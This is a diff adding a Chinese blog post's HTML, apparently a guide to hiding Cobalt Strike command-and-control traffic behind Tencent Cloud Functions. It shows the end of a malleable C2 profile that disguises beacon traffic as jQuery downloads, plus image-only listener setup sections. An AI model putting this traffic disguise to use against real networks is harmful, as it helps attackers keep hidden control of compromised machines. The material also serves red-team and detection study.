e&amp;&amp;e.length,n&#x3D;x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;&#x3D;&#x3D;&#x3D;n||0&#x3D;&#x3D;&#x3D;t||\&quot;number\&quot;&#x3D;&#x3D;typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E&#x3D;function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b&#x3D;\&quot;sizzle\&quot;+1*new Date,w&#x3D;e.document,T&#x3D;0,C&#x3D;0,E&#x3D;ae(),k&#x3D;ae(),S&#x3D;ae(),D&#x3D;function(e,t)&#123;return e&#x3D;&#x3D;&#x3D;t&amp;&amp;(f&#x3D;!0),0&#125;,N&#x3D;&#123;&#125;.hasOwnProperty,A&#x3D;[],j&#x3D;A.pop,q&#x3D;A.push,L&#x3D;A.push,H&#x3D;A.slice,O&#x3D;function(e,t)&#123;for(var n&#x3D;0,r&#x3D;e.length;n&lt;r;n++)if(e[n]&#x3D;&#x3D;&#x3D;t)return n;return-1&#125;,P&#x3D;\&quot;\r&quot;;
+#             # 1st Line
+#             prepend &quot;&#x2F;*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org&#x2F;license *&#x2F;&quot;;
+#             append &quot;\&quot;.(o&#x3D;t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0&#x3D;&#x3D;&#x3D;i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]&#x3D;function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1&#x3D;&#x3D;&#x3D;arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy&#x3D;function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;&#x3D;&#x3D;typeof t&amp;&amp;(n&#x3D;e[t],t&#x3D;e,e&#x3D;n),g(e))return r&#x3D;o.call(arguments,2),i&#x3D;function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid&#x3D;e.guid&#x3D;e.guid||w.guid++,i&#125;,w.holdReady&#x3D;function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray&#x3D;Array.isArray,w.parseJSON&#x3D;JSON.parse,w.nodeName&#x3D;N,w.isFunction&#x3D;g,w.isWindow&#x3D;y,w.camelCase&#x3D;G,w.type&#x3D;x,w.now&#x3D;Date.now,w.isNumeric&#x3D;function(e)&#123;var t&#x3D;w.type(e);return(\&quot;number\&quot;&#x3D;&#x3D;&#x3D;t||\&quot;string\&quot;&#x3D;&#x3D;&#x3D;t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;&#x3D;&#x3D;typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt&#x3D;e.jQuery,Kt&#x3D;e.$;return w.noConflict&#x3D;function(t)&#123;return e.$&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.$&#x3D;Kt),t&amp;&amp;e.jQuery&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.jQuery&#x3D;Jt),w&#125;,t||(e.jQuery&#x3D;e.$&#x3D;w),w&#125;);&quot;;
+#             print;
+#         &#125;
+#     &#125;
+# &#125;
+
+## CS 4.0 Profile Variants
+## Variants are selectable when configuring an HTTP or HTTPS Beacon listener. Variants allow each HTTP or HTTPS Beacon listener tied to a single team server to have network IOCs that differ from each other.
+## You may add profile &quot;variants&quot; by specifying additional http-get, http-post, http-stager, and https-certifcate blocks with the following syntax:
+## [block name] &quot;variant name&quot; &#123; ... &#125;. Here&#39;s a variant http-get block named &quot;My Variant&quot;:
+## http-get &quot;My Variant&quot; &#123;
+##	client &#123;
+##		parameter &quot;bar&quot; &quot;blah&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>‍</p>
+<h2 id="CS监听器配置："><a href="#CS监听器配置：" class="headerlink" title="CS监听器配置："></a>CS监听器配置：</h2><p><img src="/assets/image-20250922160951-lzmaanz.png" alt="image"></p>
+<p>‍</p>
+<h2 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h2><p><img src="/assets/image-20250922162643-wa9233f.png" alt="image"></p>
+<p><img src="/assets/image-20250922162804-fmrs1yl.png" alt="image">​</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">腾讯云函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E5%87%BD%E6%95%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">新建函数服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E7%9B%91%E5%90%AC%E5%99%A8%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">CS监听器配置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">效果：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&text=云函数之腾讯云"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&is_video=false&description=云函数之腾讯云"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=云函数之腾讯云&body=Check out this article: https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&title=云函数之腾讯云"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/&name=云函数之腾讯云&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 3inter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
